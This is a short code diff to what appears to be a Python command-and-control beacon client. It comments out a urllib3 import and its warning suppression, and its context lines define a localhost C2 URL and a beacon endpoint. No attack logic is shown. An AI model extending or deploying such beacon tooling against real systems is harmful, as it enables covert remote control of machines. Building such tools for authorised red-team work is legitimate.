@@ -6,9 +6,9 @@ import subprocess
 import time
 import json
 import random
-import urllib3
+# import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 C2_URL = "https://127.0.0.1:8443/"
 BEACON_URL = C2_URL + "/api/updates"
